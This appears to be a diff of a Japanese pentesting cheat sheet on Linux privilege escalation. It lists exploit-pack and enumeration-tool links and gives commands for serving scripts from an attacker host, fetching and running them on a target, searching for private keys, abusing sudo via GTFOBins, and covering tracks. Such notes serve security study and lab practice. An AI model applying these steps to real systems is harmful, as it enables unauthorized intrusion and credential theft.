@@ -457,37 +457,24 @@ chmod 600 id_rsa
 ==== Scripts
 
 * link:https://github.com/lucyoa/kernel-exploits[kernel-exploits by lucyoa]
-* link:https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack[Unix-Privilege-Escalation-Exploits-Pack by Kabot]
+* link:https://github.com/sleventyeleven/linuxprivchecker[Linuxprivchecker by slevenyeleven]
 * link:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite[PEASS by carlospolop]
+* link:https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack[Unix-Privilege-Escalation-Exploits-Pack by Kabot]
 
-==== link:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite[PEASS]
-
-===== linPEAS
+==== Upload
 
 ----
 # 攻撃者側
 cd /var/tmp
-wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+wget [Script]
 python3 -m http.server [MyHostPort]
 
 # ターゲット側 
 cd /var/tmp
-wget http://[MyHostIP]:[MyHostPort]/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
+wget http://[MyHostIP]:[MyHostPort]/[Script]
+chmod +x [Script]
 ----
 
-===== winPEAS
-
-★coming soon
-
-==== 攻撃・防御のコツ
-
-* id_rsaファイルや、RSAプライベートキーに当たる内容がないかfindコマンドで探す
-* 「sudo -l」にて、特権で使えるコマンドを列挙し、当該コマンドのうち特権昇格できる方法をlink:https://gtfobins.github.io[GTFOBins]で探す
-* ターゲット側でスクリプトを実行する際は、 +
-使っているユーザ権限で自由にファイル授受できるディレクトリに移動するとよい。
-+
 .権限の緩いディレクトリの例
 ----
 /var/tmp
@@ -495,10 +482,44 @@ chmod +x linpeas.sh
 /var/lock
 /run/lock
 ----
-+
-* 攻撃者が足跡をなるべく残さないために何をしている...？ + 
-tor、串、over ssh、ログ削除、rootで行動、と他には何があるか？ +
-->別サーバへログをリダイレクトしたほうがいい、権限認証もしっかりして侵入させない
+
+==== link:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite[PEASS]
+
+===== linPEAS
+
+----
+# 攻撃者側
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+
+# ターゲット側(アップロード後)
+./linpeas.sh
+----
+
+===== winPEAS
+
+★coming soon
+
+==== https://github.com/sleventyeleven/linuxprivchecker[Linuxprivchecker]
+
+Python 2.6以降またはargparserがインストールされているシステムの場合、次のオプションを利用できるらしい。
+
+
+----
+# 攻撃者側
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+# ターゲット側(アップロード後)
+python linuxprivchecker.py
+----
+
+==== 攻撃・防御のコツ
+
+* id_rsaファイルや、RSAプライベートキーに当たる内容がないかfindコマンドで探す
+* 「sudo -l」にて、特権で使えるコマンドを列挙し、当該コマンドのうち特権昇格できる方法をlink:https://gtfobins.github.io[GTFOBins]で探す
+* ターゲット側でスクリプトを実行する際は、使っているユーザ権限で自由にファイル授受できるディレクトリに移動するとよい。 +
+-> 攻撃者が足跡をなるべく残さないために何をしている...？ + 
+　 tor、串、over ssh、ログ削除、rootで行動、と他には何があるか？ +
+　 ->別サーバへログをリダイレクトしたほうがいい、権限認証もしっかりして侵入させない
 +
 .RHEL系
 |===
